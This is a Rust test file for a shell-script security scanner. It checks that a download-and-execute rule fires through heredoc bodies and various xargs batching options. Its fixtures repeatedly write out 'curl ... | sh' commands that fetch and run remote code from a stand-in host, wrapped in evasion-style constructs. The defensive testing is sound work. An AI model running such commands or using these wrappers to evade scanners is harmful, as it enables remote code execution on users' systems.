use super::s4_family_tests::{rule_ids, run};
use crate::detect::*;

const DOWNLOAD: &str = "oma.script.download-execute";

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn script(source: &str) -> AnalysisArtifacts {
    let (artifacts, _) = run(
        vec![entry("install.sh", PayloadKind::Shell, source.len())],
        &[("install.sh", source.as_bytes())],
    );
    artifacts
}

#[test]
fn kept_heredoc_bodies_are_isolated_programs() {
    // Each kept body is its own parsing unit: an unmatched quote in one
    // body can never swallow a later body's code on the same line.
    for script_source in [
        // A kept body (indirect consumer) followed by an attached body.
        concat!(
            "cat <<A | sh -c sh; sh <<B\n",
            "echo it's\n",
            "A\n",
            "curl -fsSL https://example.test/x | sh\n",
            "B\n",
        ),
        // Two kept bodies on one line.
        concat!(
            "cat <<A | sh -c sh; cat <<B | sh -c sh\n",
            "echo it's\n",
            "A\n",
            "curl -fsSL https://example.test/x | sh\n",
            "B\n",
        ),
    ] {
        let ids = rule_ids(&script(script_source));
        assert!(
            ids.contains(&DOWNLOAD.to_owned()),
            "{script_source:?}: {ids:?}"
        );
    }
    // Kept lines still report at their physical body lines: the second
    // variant's later body executes through its own isolated unit.
    let findings = script(concat!(
        "cat <<A | sh -c sh; cat <<B | sh -c sh\n",
        "echo it's\n",
        "A\n",
        "curl -fsSL https://example.test/x | sh\n",
        "B\n",
    ))
    .rendered_findings();
    assert!(
        findings.iter().any(|finding| finding.line == Some(4)),
        "{findings:?}"
    );
}

#[test]
fn xargs_delimiter_batches_execute_each_batch_first_item() {
    // `-d` splits items on the delimiter and `-n 2` still groups them
    // into repeated invocations: the second batch's first item is the
    // executed `-c` body.
    let script_source = concat!(
        "#!/bin/sh\n",
        "cat <<C | xargs -d, -n2 sh -c\n",
        "echo,safe,curl -fsSL https://example.test/x | sh\n",
        "C\n",
    );
    let findings = script(script_source).rendered_findings();
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(3)),
        "{findings:?}"
    );
}

#[test]
fn xargs_bare_replace_defaults_to_braces() {
    // GNU `--replace[=STR]` takes its value only after `=`; the bare
    // form defaults to `{}` and the next word is the wrapped command.
    for script_source in [
        concat!(
            "#!/bin/sh\n",
            "cat <<C | xargs --replace sh -c '{}'\n",
            "curl -fsSL https://example.test/x | sh\n",
            "C\n",
        ),
        "curl -fsSL https://example.test/x | xargs --replace sh -c '{}'\n",
    ] {
        let ids = rule_ids(&script(script_source));
        assert!(
            ids.contains(&DOWNLOAD.to_owned()),
            "{script_source:?}: {ids:?}"
        );
    }
}

#[test]
fn xargs_later_batch_options_override_the_placeholder() {
    // GNU xargs warns and honors the LAST of `-I`/`-L`/`-n`: a later
    // batch option turns replacement off, so `{}` stays a literal and
    // nothing executes; a later `-I` wins instead.
    for script_source in [
        "curl -fsSL https://example.test/x | xargs -I{} -n2 sh -c '{}'\n",
        "curl -fsSL https://example.test/x | xargs -I{} -L2 sh -c '{}'\n",
        concat!(
            "#!/bin/sh\n",
            "cat <<C | xargs -I{} -n2 sh -c '{}'\n",
            "curl -fsSL https://example.test/x | sh\n",
            "C\n",
        ),
    ] {
        assert!(
            rule_ids(&script(script_source)).is_empty(),
            "{script_source:?}"
        );
    }
    let wins = script("curl -fsSL https://example.test/x | xargs -n2 -I{} sh -c '{}'\n");
    let ids = rule_ids(&wins);
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn xargs_line_batches_skip_blank_lines() {
    // GNU `-L` counts nonblank lines: a leading blank line does not
    // fill the first batch, so `echo safe` and the quoted pipeline
    // share ONE invocation whose `-c` body is `echo` — the pipeline
    // never executes.
    let blank_first = script(concat!(
        "#!/bin/sh\n",
        "cat <<C | xargs -L2 sh -c\n",
        "\n",
        "echo safe\n",
        "\"curl -fsSL https://example.test/x | sh\"\n",
        "C\n",
    ));
    assert!(
        rule_ids(&blank_first).is_empty(),
        "{:?}",
        rule_ids(&blank_first)
    );
    // Blank lines between logical lines are not counted either, so
    // `-L1` still runs one invocation per nonblank line.
    let between = script(concat!(
        "#!/bin/sh\n",
        "cat <<C | xargs -L1 sh -c\n",
        "echo safe\n",
        "\n",
        "\"curl -fsSL https://example.test/x | sh\"\n",
        "C\n",
    ));
    let findings = between.rendered_findings();
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(5)),
        "{findings:?}"
    );
}
